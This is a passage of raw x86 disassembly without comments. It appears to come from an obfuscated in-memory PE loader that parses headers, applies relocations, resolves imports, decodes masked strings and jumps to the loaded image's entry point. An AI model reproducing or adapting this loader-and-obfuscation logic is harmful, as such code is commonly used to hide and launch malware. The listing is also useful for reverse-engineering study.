  413a6d:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  413a74:	mov    ebx,DWORD PTR [ebp-0x4]
  413a77:	xor    ebx,esi
  413a79:	add    ebx,edi
  413a7b:	jmp    0x413b42
  413a80:	mov    eax,DWORD PTR [ebp-0x4]
  413a83:	xor    eax,esi
  413a85:	add    eax,edi
  413a87:	mov    DWORD PTR [ebp-0x14],eax
  413a8a:	mov    eax,DWORD PTR [ebp-0x4]
  413a8d:	xor    eax,esi
  413a8f:	add    eax,edi
  413a91:	mov    DWORD PTR [ebp+0xc],eax
  413a94:	mov    ecx,DWORD PTR [ebp-0x4]
  413a97:	mov    eax,DWORD PTR [ebp-0x24]
  413a9a:	xor    ecx,esi
  413a9c:	add    ecx,edi
  413a9e:	cmp    ecx,eax
  413aa0:	je     0x413aa8
  413aa2:	mov    eax,DWORD PTR [eax+ebx*4]
  413aa5:	mov    DWORD PTR [ebp-0x14],eax
  413aa8:	mov    eax,DWORD PTR [ebp-0x1c]
  413aab:	mov    eax,DWORD PTR [eax+ebx*4]
  413aae:	mov    DWORD PTR [ebp+0xc],eax
  413ab1:	mov    eax,DWORD PTR [ebp-0x4]
  413ab4:	mov    ecx,DWORD PTR [ebp-0x14]
  413ab7:	xor    eax,esi
  413ab9:	add    eax,edi
  413abb:	cmp    eax,ecx
  413abd:	je     0x413ae8
  413abf:	mov    eax,DWORD PTR [ebp-0x4]
  413ac2:	mov    ecx,DWORD PTR [ebp-0x14]
  413ac5:	xor    eax,esi
  413ac7:	add    eax,edi
  413ac9:	shr    ecx,0x1f
  413acc:	cmp    eax,ecx
  413ace:	je     0x413ae8
  413ad0:	mov    ecx,DWORD PTR [ebp-0x14]
  413ad3:	mov    eax,DWORD PTR [ebp+0x10]
  413ad6:	mov    eax,DWORD PTR [eax+0x1d8]
  413adc:	movzx  ecx,cx
  413adf:	push   ecx
  413ae0:	push   DWORD PTR [ebp-0xc]
  413ae3:	call   DWORD PTR [eax+0x8]
  413ae6:	jmp    0x413b01
  413ae8:	mov    eax,DWORD PTR [ebp+0xc]
  413aeb:	add    eax,DWORD PTR [ebp+0x8]
  413aee:	mov    ecx,DWORD PTR [ebp+0x10]
  413af1:	mov    ecx,DWORD PTR [ecx+0x1d8]
  413af7:	add    eax,0x2
  413afa:	push   eax
  413afb:	push   DWORD PTR [ebp-0xc]
  413afe:	call   DWORD PTR [ecx+0x8]
  413b01:	mov    DWORD PTR [ebp+0xc],eax
  413b04:	mov    eax,DWORD PTR [ebp-0x4]
  413b07:	mov    ecx,DWORD PTR [ebp+0xc]
  413b0a:	xor    eax,esi
  413b0c:	add    eax,edi
  413b0e:	cmp    eax,ecx
  413b10:	mov    eax,DWORD PTR [ebp-0x8]
  413b13:	jne    0x413b26
  413b15:	mov    ecx,DWORD PTR [ebp-0x18]
  413b18:	xor    eax,esi
  413b1a:	lea    eax,[ecx+eax*1+0x3272dd]
  413b21:	mov    DWORD PTR [ebp-0x18],eax
  413b24:	jmp    0x413b36
  413b26:	mov    ecx,DWORD PTR [ebp+0xc]
  413b29:	xor    eax,esi
  413b2b:	add    eax,edi
  413b2d:	imul   eax,ecx
  413b30:	mov    ecx,DWORD PTR [ebp-0x1c]
  413b33:	mov    DWORD PTR [ecx+ebx*4],eax
  413b36:	mov    eax,DWORD PTR [ebp-0x8]
  413b39:	xor    eax,esi
  413b3b:	lea    ebx,[ebx+eax*1+0x3272dd]
  413b42:	mov    eax,DWORD PTR [ebp-0x4]
  413b45:	mov    ecx,DWORD PTR [ebp-0x1c]
  413b48:	xor    eax,esi
  413b4a:	add    eax,edi
  413b4c:	cmp    DWORD PTR [ecx+ebx*4],eax
  413b4f:	jne    0x413a80
  413b55:	mov    edx,DWORD PTR [ebp-0x10]
  413b58:	mov    eax,DWORD PTR [ebp-0x18]
  413b5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  413b5e:	sub    edx,0x3272dc
  413b64:	xor    edx,esi
  413b66:	jmp    0x413930
  413b6b:	mov    ecx,DWORD PTR [ebp-0x4]
  413b6e:	xor    ecx,esi
  413b70:	add    ecx,edi
  413b72:	cmp    eax,ecx
  413b74:	mov    eax,DWORD PTR [ebp-0x4]
  413b77:	jne    0x413b81
  413b79:	mov    eax,DWORD PTR [ebp-0x8]
  413b7c:	jmp    0x413b81
  413b7e:	mov    eax,DWORD PTR [ebp-0x4]
  413b81:	xor    eax,esi
  413b83:	add    eax,edi
  413b85:	pop    edi
  413b86:	pop    esi
  413b87:	pop    ebx
  413b88:	leave  
  413b89:	ret    0xc
  413b8c:	push   ebp
  413b8d:	mov    ebp,esp
  413b8f:	sub    esp,0x28
  413b92:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  413b99:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  413ba0:	mov    eax,DWORD PTR [ebp+0xc]
  413ba3:	mov    DWORD PTR [ebp+0xc],eax
  413ba6:	push   esi
  413ba7:	mov    eax,eax
  413ba9:	mov    eax,DWORD PTR [ebp-0x4]
  413bac:	mov    esi,DWORD PTR [ebp+0x8]
  413baf:	mov    ecx,0x7510896
  413bb4:	xor    eax,ecx
  413bb6:	mov    edx,0x3272dd
  413bbb:	add    eax,edx
  413bbd:	cmp    esi,eax
  413bbf:	je     0x413ce6
  413bc5:	mov    eax,DWORD PTR [ebp+0x8]
  413bc8:	mov    esi,DWORD PTR [ebp+0x8]
  413bcb:	add    esi,DWORD PTR [eax+0x3c]
  413bce:	push   edi
  413bcf:	mov    DWORD PTR [ebp+0xc],esi
  413bd2:	mov    DWORD PTR [ebp-0x1c],0xf89c85be
  413bd9:	mov    eax,DWORD PTR [ebp-0x1c]
  413bdc:	mov    esi,DWORD PTR [ebp-0x4]
  413bdf:	mov    edi,DWORD PTR [ebp+0xc]
  413be2:	xor    esi,ecx
  413be4:	xor    eax,ecx
  413be6:	add    esi,edx
  413be8:	cmp    DWORD PTR [edi+eax*8+0x1939760],esi
  413bef:	je     0x413ce0
  413bf5:	mov    esi,DWORD PTR [ebp+0xc]
  413bf8:	mov    eax,DWORD PTR [ebp+0x8]
  413bfb:	add    eax,DWORD PTR [esi+0xa0]
  413c01:	mov    esi,DWORD PTR [ebp+0x8]
  413c04:	mov    edi,DWORD PTR [ebp+0xc]
  413c07:	sub    esi,DWORD PTR [edi+0x34]
  413c0a:	mov    edi,DWORD PTR [ebp-0x4]
  413c0d:	xor    edi,ecx
  413c0f:	add    edi,edx
  413c11:	mov    DWORD PTR [ebp-0x24],esi
  413c14:	cmp    esi,edi
  413c16:	je     0x413ce0
  413c1c:	mov    esi,DWORD PTR [ebp-0x4]
  413c1f:	xor    esi,ecx
  413c21:	add    esi,edx
  413c23:	mov    DWORD PTR [ebp-0x8],esi
  413c26:	push   ebx
  413c27:	mov    DWORD PTR [ebp-0x10],0xf89c85b0
  413c2e:	jmp    0x413cca
  413c33:	mov    esi,DWORD PTR [ebp-0x4]
  413c36:	xor    esi,ecx
  413c38:	lea    edi,[ebx-0x8]
  413c3b:	add    esi,edx
  413c3d:	shr    edi,1
  413c3f:	cmp    esi,edi
  413c41:	jae    0x413cb0
  413c43:	sub    edi,esi
  413c45:	lea    ebx,[eax+esi*2+0x8]
  413c49:	mov    DWORD PTR [ebp-0x18],edi
  413c4c:	movzx  esi,WORD PTR [ebx]
  413c4f:	and    esi,0xfff
  413c55:	mov    DWORD PTR [ebp-0x14],esi
  413c58:	mov    edi,DWORD PTR [ebp-0x14]
  413c5b:	mov    esi,DWORD PTR [eax]
  413c5d:	sub    esi,edx
  413c5f:	add    edi,esi
  413c61:	movzx  esi,WORD PTR [ebx]
  413c64:	shr    esi,0xc
  413c67:	xor    edi,ecx
  413c69:	mov    DWORD PTR [ebp-0x20],edi
  413c6c:	mov    DWORD PTR [ebp-0x14],esi
  413c6f:	mov    esi,DWORD PTR [ebp-0x20]
  413c72:	mov    edi,DWORD PTR [ebp+0x8]
  413c75:	xor    esi,ecx
  413c77:	lea    esi,[esi+edi*1+0x3272dd]
  413c7e:	mov    DWORD PTR [ebp-0x20],esi
  413c81:	mov    esi,DWORD PTR [ebp-0x10]
  413c84:	mov    edi,DWORD PTR [ebp-0x14]
  413c87:	xor    esi,ecx
  413c89:	add    esi,edx
  413c8b:	cmp    edi,esi
  413c8d:	jne    0x413ca5
  413c8f:	mov    esi,DWORD PTR [ebp-0x10]
  413c92:	mov    edi,DWORD PTR [ebp-0x14]
  413c95:	xor    esi,ecx
  413c97:	add    esi,edx
  413c99:	cmp    edi,esi
  413c9b:	jne    0x413ca5
  413c9d:	mov    esi,DWORD PTR [ebp-0x20]
  413ca0:	mov    edi,DWORD PTR [ebp-0x24]
  413ca3:	add    DWORD PTR [esi],edi
  413ca5:	add    ebx,0x2
  413ca8:	dec    DWORD PTR [ebp-0x18]
  413cab:	jne    0x413c4c
  413cad:	mov    ebx,DWORD PTR [ebp-0xc]
  413cb0:	add    DWORD PTR [ebp-0x8],ebx
  413cb3:	mov    esi,DWORD PTR [ebp-0x1c]
  413cb6:	mov    edi,DWORD PTR [ebp-0x8]
  413cb9:	mov    ebx,DWORD PTR [ebp+0xc]
  413cbc:	xor    esi,ecx
  413cbe:	cmp    edi,DWORD PTR [ebx+esi*8+0x1939764]
  413cc5:	jae    0x413cdf
  413cc7:	add    eax,DWORD PTR [ebp-0xc]
  413cca:	mov    esi,DWORD PTR [ebp-0x4]
  413ccd:	mov    ebx,DWORD PTR [eax+0x4]
  413cd0:	xor    esi,ecx
  413cd2:	add    esi,edx
  413cd4:	mov    DWORD PTR [ebp-0xc],ebx
  413cd7:	cmp    ebx,esi
  413cd9:	jne    0x413c33
  413cdf:	pop    ebx
  413ce0:	mov    eax,DWORD PTR [ebp-0x28]
  413ce3:	pop    edi
  413ce4:	jmp    0x413ce9
  413ce6:	mov    eax,DWORD PTR [ebp-0x4]
  413ce9:	xor    eax,ecx
  413ceb:	add    eax,edx
  413ced:	pop    esi
  413cee:	leave  
  413cef:	ret    0x8
  413cf2:	push   ebp
  413cf3:	mov    ebp,esp
  413cf5:	sub    esp,0x54
  413cf8:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  413cff:	mov    DWORD PTR [ebp-0x24],0xf89c85b2
  413d06:	mov    eax,DWORD PTR [ebp-0x4]
  413d09:	push   ebx
  413d0a:	push   esi
  413d0b:	mov    esi,0x7510896
  413d10:	xor    eax,esi
  413d12:	mov    ebx,0x3272dd
  413d17:	add    eax,ebx
  413d19:	mov    DWORD PTR [ebp-0x18],eax
  413d1c:	mov    eax,DWORD PTR [ebp-0x4]
  413d1f:	xor    eax,esi
  413d21:	add    eax,ebx
  413d23:	mov    DWORD PTR [ebp-0x20],eax
  413d26:	push   edi
  413d27:	mov    edi,DWORD PTR [ebp+0x20]
  413d2a:	mov    eax,DWORD PTR [ebp-0x10]
  413d2d:	mov    ecx,DWORD PTR [ebp-0x10]
  413d30:	xor    eax,ecx
  413d32:	mov    DWORD PTR [ebp-0x10],eax
  413d35:	add    DWORD PTR [ebp-0x10],0xf89cb5b5
  413d3c:	mov    eax,DWORD PTR [ebp-0x8]
  413d3f:	mov    ecx,DWORD PTR [ebp-0x8]
  413d42:	xor    eax,ecx
  413d44:	mov    DWORD PTR [ebp-0x8],eax
  413d47:	add    DWORD PTR [ebp-0x8],0xf89c85f5
  413d4e:	mov    eax,DWORD PTR [ebp-0xc]
  413d51:	mov    ecx,DWORD PTR [ebp-0xc]
  413d54:	xor    eax,ecx
  413d56:	mov    DWORD PTR [ebp-0xc],eax
  413d59:	add    DWORD PTR [ebp-0xc],0xf89c85b1
  413d60:	mov    eax,DWORD PTR [ebp-0x14]
  413d63:	mov    ecx,DWORD PTR [ebp-0x14]
  413d66:	xor    eax,ecx
  413d68:	mov    DWORD PTR [ebp-0x14],eax
  413d6b:	add    DWORD PTR [ebp-0x14],0xf89f05b5
  413d72:	mov    eax,0x9588
  413d77:	mov    WORD PTR [ebp+0x20],ax
  413d7b:	mov    eax,DWORD PTR [ebp+0x8]
  413d7e:	test   eax,eax
  413d80:	je     0x414165
  413d86:	mov    eax,DWORD PTR [ebp+0xc]
  413d89:	test   eax,eax
  413d8b:	je     0x414165
  413d91:	mov    eax,DWORD PTR [ebp+0x18]
  413d94:	test   eax,eax
  413d96:	je     0x414165
  413d9c:	mov    ax,WORD PTR [ebp+0x20]
  413da0:	mov    ecx,0x8a89
  413da5:	xor    ax,cx
  413da8:	mov    ecx,0x3b4c
  413dad:	add    ax,cx
  413db0:	mov    ecx,DWORD PTR [ebp+0x8]
  413db3:	cmp    WORD PTR [ecx],ax
  413db6:	jne    0x414165
  413dbc:	mov    eax,DWORD PTR [ebp-0x4]
  413dbf:	mov    ecx,DWORD PTR [ebp+0x8]
  413dc2:	mov    eax,DWORD PTR [ebp+0x8]
  413dc5:	add    eax,DWORD PTR [ecx+0x3c]
  413dc8:	mov    DWORD PTR [ebp+0xc],eax
  413dcb:	mov    eax,DWORD PTR [eax+0x50]
  413dce:	test   eax,eax
  413dd0:	je     0x414165
  413dd6:	mov    DWORD PTR [ebp-0x2c],0xf88c85b5
  413ddd:	mov    eax,DWORD PTR [ebp-0x2c]
  413de0:	xor    eax,esi
  413de2:	add    eax,ebx
  413de4:	mov    DWORD PTR [ebp-0x2c],eax
  413de7:	mov    eax,DWORD PTR [ebp-0x4]
  413dea:	mov    eax,DWORD PTR [edi+0x190]
  413df0:	mov    ecx,DWORD PTR [eax]
  413df2:	mov    ecx,DWORD PTR [ecx+0x3c]
  413df5:	add    ecx,DWORD PTR [eax]
  413df7:	mov    eax,DWORD PTR [ebp-0x4]
  413dfa:	mov    eax,DWORD PTR [edi+0x18c]
  413e00:	mov    edx,DWORD PTR [eax]
  413e02:	mov    DWORD PTR [ebp-0x1c],ecx
  413e05:	mov    DWORD PTR [ebp+0x20],edx
  413e08:	cmp    edx,edx
  413e0a:	jne    0x413e3f
  413e0c:	mov    eax,DWORD PTR [edi+0x1d8]
  413e12:	lea    edx,[ebp-0x18]
  413e15:	push   edx
  413e16:	mov    edx,DWORD PTR [ebp-0x8]
  413e19:	xor    edx,esi
  413e1b:	add    edx,ebx
  413e1d:	push   edx
  413e1e:	push   DWORD PTR [ecx+0x50]
  413e21:	push   DWORD PTR [ebp+0x20]
  413e24:	call   DWORD PTR [eax+0x1c]
  413e27:	mov    ecx,DWORD PTR [ebp-0x1c]
  413e2a:	mov    eax,DWORD PTR [ecx+0x54]
  413e2d:	mov    ecx,DWORD PTR [ecx+0x50]
  413e30:	sub    ecx,eax
  413e32:	add    eax,DWORD PTR [ebp+0x20]
  413e35:	push   ecx
  413e36:	push   eax
  413e37:	call   0x414779
  413e3c:	mov    edx,DWORD PTR [ebp+0x20]
  413e3f:	mov    eax,DWORD PTR [edi+0x194]
  413e45:	mov    DWORD PTR [eax],edx
  413e47:	mov    eax,DWORD PTR [ebp+0xc]
  413e4a:	push   DWORD PTR [eax+0x54]
  413e4d:	push   DWORD PTR [ebp+0x8]
  413e50:	push   edx
  413e51:	call   0x414620
  413e56:	mov    ecx,DWORD PTR [ebp+0x20]
  413e59:	mov    eax,DWORD PTR [ecx+0x3c]
  413e5c:	add    eax,ecx
  413e5e:	movzx  ecx,WORD PTR [eax+0x14]
  413e62:	lea    ecx,[ecx+eax*1+0x18]
  413e66:	mov    DWORD PTR [ebp+0x18],ecx
  413e69:	mov    ecx,DWORD PTR [ebp-0x4]
  413e6c:	movzx  edx,WORD PTR [eax+0x6]
  413e70:	xor    ecx,esi
  413e72:	add    ecx,ebx
  413e74:	mov    DWORD PTR [ebp+0xc],eax
  413e77:	cmp    edx,ecx
  413e79:	je     0x413f27
  413e7f:	mov    ecx,DWORD PTR [ebp-0x4]
  413e82:	xor    ecx,esi
  413e84:	add    ecx,ebx
  413e86:	mov    DWORD PTR [ebp-0x20],ecx
  413e89:	mov    ecx,DWORD PTR [ebp-0x24]
  413e8c:	movzx  edx,WORD PTR [eax+0x6]
  413e90:	xor    ecx,esi
  413e92:	sub    edx,ecx
  413e94:	sub    edx,ebx
  413e96:	cmp    DWORD PTR [ebp-0x20],edx
  413e99:	ja     0x413f27
  413e9f:	mov    edx,DWORD PTR [ebp+0x18]
  413ea2:	add    edx,0x8
  413ea5:	mov    DWORD PTR [ebp+0x18],edx
  413ea8:	jmp    0x413ead
  413eaa:	mov    edx,DWORD PTR [ebp+0x18]
  413ead:	mov    eax,DWORD PTR [eax+0x38]
  413eb0:	lea    ecx,[eax-0x1]
  413eb3:	mov    DWORD PTR [ebp-0x30],eax
  413eb6:	mov    eax,DWORD PTR [edx]
  413eb8:	test   ecx,eax
  413eba:	je     0x413ec3
  413ebc:	not    ecx
  413ebe:	and    eax,ecx
  413ec0:	add    eax,DWORD PTR [ebp-0x30]
  413ec3:	push   eax
  413ec4:	mov    eax,DWORD PTR [edx+0x4]
  413ec7:	add    eax,DWORD PTR [ebp+0x20]
  413eca:	push   eax
  413ecb:	call   0x414779
  413ed0:	mov    edx,DWORD PTR [ebp-0x4]
  413ed3:	mov    eax,DWORD PTR [ebp+0x18]
  413ed6:	mov    ecx,DWORD PTR [eax+0x8]
  413ed9:	xor    edx,esi
  413edb:	add    edx,ebx
  413edd:	cmp    ecx,edx
  413edf:	je     0x413ef8
  413ee1:	push   ecx
  413ee2:	mov    ecx,DWORD PTR [ebp+0x8]
  413ee5:	add    ecx,DWORD PTR [eax+0xc]
  413ee8:	mov    eax,DWORD PTR [eax+0x4]
  413eeb:	add    eax,DWORD PTR [ebp+0x20]
  413eee:	push   ecx
  413eef:	push   eax
  413ef0:	call   0x414620
  413ef5:	mov    eax,DWORD PTR [ebp+0x18]
  413ef8:	mov    ecx,DWORD PTR [ebp-0x24]
  413efb:	mov    edx,DWORD PTR [ebp-0x20]
  413efe:	add    eax,0x28
  413f01:	xor    ecx,esi
  413f03:	lea    ecx,[edx+ecx*1+0x3272dd]
  413f0a:	mov    edx,DWORD PTR [ebp+0xc]
  413f0d:	mov    DWORD PTR [ebp+0x18],eax
  413f10:	mov    eax,DWORD PTR [ebp-0x24]
  413f13:	movzx  edx,WORD PTR [edx+0x6]
  413f17:	xor    eax,esi
  413f19:	sub    edx,eax
  413f1b:	mov    eax,DWORD PTR [ebp+0xc]
  413f1e:	sub    edx,ebx
  413f20:	mov    DWORD PTR [ebp-0x20],ecx
  413f23:	cmp    ecx,edx
  413f25:	jbe    0x413eaa
  413f27:	mov    ecx,DWORD PTR [ebp-0x4]
  413f2a:	mov    edx,DWORD PTR [edi+0x18c]
  413f30:	xor    ecx,esi
  413f32:	add    ecx,ebx
  413f34:	mov    DWORD PTR [ebp+0x18],ecx
  413f37:	mov    ecx,DWORD PTR [ebp+0x20]
  413f3a:	cmp    ecx,DWORD PTR [edx]
  413f3c:	jne    0x413f65
  413f3e:	mov    eax,DWORD PTR [edi+0x1d8]
  413f44:	lea    edx,[ebp-0x18]
  413f47:	push   edx
  413f48:	mov    edx,DWORD PTR [ebp-0xc]
  413f4b:	xor    edx,esi
  413f4d:	add    edx,ebx
  413f4f:	push   edx
  413f50:	mov    edx,DWORD PTR [ebp-0x1c]
  413f53:	push   DWORD PTR [edx+0x54]
  413f56:	push   ecx
  413f57:	call   DWORD PTR [eax+0x1c]
  413f5a:	test   eax,eax
  413f5c:	je     0x414156
  413f62:	mov    eax,DWORD PTR [ebp+0xc]
  413f65:	mov    ecx,DWORD PTR [edi+0x1c8]
  413f6b:	mov    ecx,DWORD PTR [ecx]
  413f6d:	xor    ecx,esi
  413f6f:	add    ecx,ebx
  413f71:	je     0x414081
  413f77:	and    DWORD PTR [ebp-0x28],0x0
  413f7b:	mov    eax,0x4fab
  413f80:	mov    WORD PTR [ebp-0x3c],ax
  413f84:	add    eax,0xfffffff6
  413f87:	mov    WORD PTR [ebp-0x3a],ax
  413f8b:	mov    eax,0x4f91
  413f90:	mov    WORD PTR [ebp-0x38],ax
  413f94:	add    eax,0x18
  413f97:	and    DWORD PTR [ebp+0x8],0x0
  413f9b:	mov    ecx,eax
  413f9d:	mov    WORD PTR [ebp-0x34],ax
  413fa1:	mov    eax,0x4e3d
  413fa6:	mov    WORD PTR [ebp-0x36],cx
  413faa:	mov    WORD PTR [ebp-0x32],ax
  413fae:	mov    eax,DWORD PTR [ebp+0x8]
  413fb1:	lea    eax,[ebp+eax*2-0x3c]
  413fb5:	mov    ecx,0x8a89
  413fba:	xor    cx,WORD PTR [eax]
  413fbd:	mov    edx,0x3b4c
  413fc2:	add    cx,dx
  413fc5:	inc    DWORD PTR [ebp+0x8]
  413fc8:	cmp    DWORD PTR [ebp+0x8],0x6
  413fcc:	mov    WORD PTR [eax],cx
  413fcf:	jb     0x413fae
  413fd1:	mov    DWORD PTR [ebp-0x54],0x200c1e26
  413fd8:	mov    DWORD PTR [ebp-0x50],0x211e0805
  413fdf:	mov    DWORD PTR [ebp-0x4c],0xf50c0e08
  413fe6:	mov    DWORD PTR [ebp-0x48],0x3d0c0b20
  413fed:	mov    DWORD PTR [ebp-0x44],0x10c1e1e
  413ff4:	mov    WORD PTR [ebp-0x40],0xf0f
  413ffa:	mov    BYTE PTR [ebp-0x3e],0x7a
  413ffe:	xor    ecx,ecx
  414000:	lea    eax,[ebp+ecx*1-0x54]
  414004:	mov    dl,BYTE PTR [eax]
  414006:	xor    dl,0x71
  414009:	sub    dl,0xb
  41400c:	inc    ecx
  41400d:	mov    BYTE PTR [eax],dl
  41400f:	cmp    ecx,0x17
  414012:	jb     0x414000
  414014:	mov    eax,DWORD PTR [edi+0x1d8]
  41401a:	lea    ecx,[ebp-0x3c]
  41401d:	push   ecx
  41401e:	call   DWORD PTR [eax+0x4]
  414021:	mov    ecx,DWORD PTR [edi+0x1d8]
  414027:	lea    edx,[ebp-0x54]
  41402a:	push   edx
  41402b:	push   eax
  41402c:	call   DWORD PTR [ecx+0x8]
  41402f:	lea    ecx,[ebp-0x28]
  414032:	push   ecx
  414033:	mov    ecx,DWORD PTR [edi+0x18c]
  414039:	push   DWORD PTR [ecx]
  41403b:	call   eax
  41403d:	mov    eax,DWORD PTR [ebp-0x28]
  414040:	test   eax,eax
  414042:	je     0x41407e
  414044:	mov    DWORD PTR [ebp+0x8],eax
  414047:	jmp    0x414053
  414049:	mov    eax,DWORD PTR [eax]
  41404b:	mov    DWORD PTR [ebp-0x28],eax
  41404e:	cmp    eax,DWORD PTR [ebp+0x8]
  414051:	je     0x414060
  414053:	mov    edx,DWORD PTR [eax+0x18]
  414056:	mov    ecx,DWORD PTR [edi+0x18c]
  41405c:	cmp    edx,DWORD PTR [ecx]
  41405e:	jne    0x414049
  414060:	mov    edx,DWORD PTR [eax+0x18]
  414063:	mov    ecx,DWORD PTR [edi+0x18c]
  414069:	cmp    edx,DWORD PTR [ecx]
  41406b:	jne    0x41407e
  41406d:	mov    edx,DWORD PTR [ebp-0x1c]
  414070:	mov    ecx,DWORD PTR [edi+0x190]
  414076:	mov    edx,DWORD PTR [edx+0x28]
  414079:	add    edx,DWORD PTR [ecx]
  41407b:	mov    DWORD PTR [eax+0x1c],edx
  41407e:	mov    eax,DWORD PTR [ebp+0xc]
  414081:	push   edi
  414082:	push   eax
  414083:	push   DWORD PTR [ebp+0x20]
  414086:	call   0x4138a9
  41408b:	test   eax,eax
  41408d:	je     0x414156
  414093:	push   DWORD PTR [ebp+0xc]
  414096:	mov    ecx,edi
  414098:	push   DWORD PTR [ebp+0x20]
  41409b:	call   0x413802
  4140a0:	test   eax,eax
  4140a2:	je     0x414156
  4140a8:	mov    eax,DWORD PTR [ebp+0xc]
  4140ab:	mov    edx,DWORD PTR [ebp+0x20]
  4140ae:	mov    ecx,edi
  4140b0:	call   0x4136db
  4140b5:	test   eax,eax
  4140b7:	je     0x414156
  4140bd:	push   edi
  4140be:	push   DWORD PTR [ebp+0x20]
  4140c1:	call   0x413b8c
  4140c6:	test   eax,eax
  4140c8:	je     0x414156
  4140ce:	mov    eax,DWORD PTR [edi+0x18c]
  4140d4:	mov    edx,DWORD PTR [ebp+0x20]
  4140d7:	cmp    edx,DWORD PTR [eax]
  4140d9:	jne    0x4140f5
  4140db:	mov    eax,DWORD PTR [edi+0x1d8]
  4140e1:	lea    ecx,[ebp-0x18]
  4140e4:	push   ecx
  4140e5:	push   DWORD PTR [ebp-0x18]
  4140e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4140eb:	push   DWORD PTR [ecx+0x54]
  4140ee:	push   edx
  4140ef:	call   DWORD PTR [eax+0x1c]
  4140f2:	mov    edx,DWORD PTR [ebp+0x20]
  4140f5:	mov    eax,DWORD PTR [edi+0x1c8]
  4140fb:	mov    eax,DWORD PTR [eax]
  4140fd:	xor    eax,esi
  4140ff:	add    eax,ebx
  414101:	je     0x41413a
  414103:	mov    ecx,DWORD PTR [ebp+0xc]
  414106:	mov    eax,DWORD PTR [ecx+0x28]
  414109:	mov    DWORD PTR [ebp+0x8],0xf89ca5b5
  414110:	mov    esi,DWORD PTR [ebp+0x8]
  414113:	push   DWORD PTR [ebp+0x14]
  414116:	xor    esi,0x896
  41411c:	push   DWORD PTR [ebp+0x10]
  41411f:	add    esi,0x72dd
  414125:	or     WORD PTR [ecx+0x16],si
  414129:	add    eax,edx
  41412b:	push   edx
  41412c:	call   eax
  41412e:	mov    DWORD PTR [edi+0x1d0],0xf89c85b2
  414138:	jmp    0x414144
  41413a:	mov    eax,DWORD PTR [ebp+0xc]
  41413d:	mov    eax,DWORD PTR [eax+0x28]
  414140:	add    eax,edx
  414142:	call   eax
  414144:	mov    DWORD PTR [ebp-0x20],eax
  414147:	mov    eax,DWORD PTR [ebp-0x20]
  41414a:	mov    ecx,DWORD PTR [ebp+0x1c]
  41414d:	mov    DWORD PTR [ecx],eax
  41414f:	mov    DWORD PTR [ebp+0x18],0x1
  414156:	cmp    DWORD PTR [ebp+0x18],0x0
  41415a:	jne    0x414160
  41415c:	and    DWORD PTR [ebp+0x20],0x0
  414160:	mov    eax,DWORD PTR [ebp+0x20]
  414163:	jmp    0x414167
  414165:	xor    eax,eax
  414167:	pop    edi
  414168:	pop    esi
  414169:	pop    ebx
  41416a:	leave  
  41416b:	ret    0x1c
  41416e:	push   ebp
  41416f:	mov    ebp,esp
  414171:	movzx  edx,WORD PTR [ecx+0x6]
  414175:	movzx  eax,WORD PTR [ecx+0x14]
  414179:	push   ebx
  41417a:	push   edi
  41417b:	xor    edi,edi
  41417d:	lea    eax,[eax+ecx*1+0x18]
  414181:	test   edx,edx
  414183:	je     0x4141a4
  414185:	mov    ecx,DWORD PTR [eax+0xc]
  414188:	lea    ebx,[ecx+esi*1]
  41418b:	cmp    DWORD PTR [ebp+0x8],ebx
  41418e:	jb     0x41419c
  414190:	mov    ebx,DWORD PTR [eax+0x8]
  414193:	add    ebx,ecx
  414195:	add    ebx,esi
  414197:	cmp    DWORD PTR [ebp+0x8],ebx
  41419a:	jb     0x4141a6
  41419c:	add    eax,0x28
  41419f:	inc    edi
  4141a0:	cmp    edi,edx
  4141a2:	jb     0x414185
  4141a4:	xor    eax,eax
  4141a6:	pop    edi
  4141a7:	pop    ebx
  4141a8:	pop    ebp
  4141a9:	ret    0x4
  4141ac:	push   ebp
  4141ad:	mov    ebp,esp
  4141af:	sub    esp,0x28
  4141b2:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  4141b9:	mov    DWORD PTR [ebp-0x1c],0xf89c85b2
  4141c0:	mov    DWORD PTR [ebp-0x28],0xf89c85b3
  4141c7:	mov    eax,0x4f9c
  4141cc:	mov    WORD PTR [ebp-0xc],ax
  4141d0:	mov    eax,0x4e7c
  4141d5:	mov    WORD PTR [ebp-0x4],ax
  4141d9:	mov    eax,0x4fa7
  4141de:	mov    WORD PTR [ebp-0x8],ax
  4141e2:	add    eax,0xffffffe0
  4141e5:	mov    WORD PTR [ebp-0x8],ax
  4141e9:	mov    eax,DWORD PTR [ebp+0x8]
  4141ec:	mov    DWORD PTR [ebp-0x14],eax
  4141ef:	mov    eax,DWORD PTR [ebp+0xc]
  4141f2:	mov    DWORD PTR [ebp-0x18],eax
  4141f5:	mov    eax,DWORD PTR [ebp-0x10]
  4141f8:	push   ebx
  4141f9:	mov    ecx,0x7510896
  4141fe:	xor    eax,ecx
  414200:	push   esi
  414201:	mov    esi,DWORD PTR [ebp-0x14]
  414204:	mov    edx,0x3272dd
  414209:	add    eax,edx
  41420b:	push   edi
  41420c:	cmp    esi,eax
  41420e:	je     0x41440c
  414214:	mov    eax,DWORD PTR [ebp-0x10]
  414217:	mov    esi,DWORD PTR [ebp-0x18]
  41421a:	xor    eax,ecx
  41421c:	add    eax,edx
  41421e:	cmp    esi,eax
  414220:	je     0x41440c
  414226:	mov    eax,DWORD PTR [ebp-0x10]
  414229:	xor    eax,ecx
  41422b:	add    eax,edx
  41422d:	mov    DWORD PTR [ebp-0x20],eax
  414230:	mov    eax,DWORD PTR [ebp-0x10]
  414233:	xor    eax,ecx
  414235:	add    eax,edx
  414237:	mov    DWORD PTR [ebp-0x24],eax
  41423a:	movzx  esi,WORD PTR [ebp-0x4]
  41423e:	movzx  edi,WORD PTR [ebp-0xc]
  414242:	mov    eax,0x8a89
  414247:	xor    si,ax
  41424a:	mov    ebx,0x8a89
  41424f:	xor    di,bx
  414252:	mov    eax,0x3b4c
  414257:	add    si,ax
  41425a:	add    di,ax
  41425d:	sub    edi,esi
  41425f:	mov    WORD PTR [ebp-0xc],di
  414263:	mov    esi,DWORD PTR [ebp-0x20]
  414266:	mov    edi,DWORD PTR [ebp-0x14]
  414269:	mov    si,WORD PTR [edi+esi*2]
  41426d:	mov    WORD PTR [ebp+0x8],si
  414271:	mov    esi,DWORD PTR [ebp-0x24]
  414274:	mov    edi,DWORD PTR [ebp-0x18]
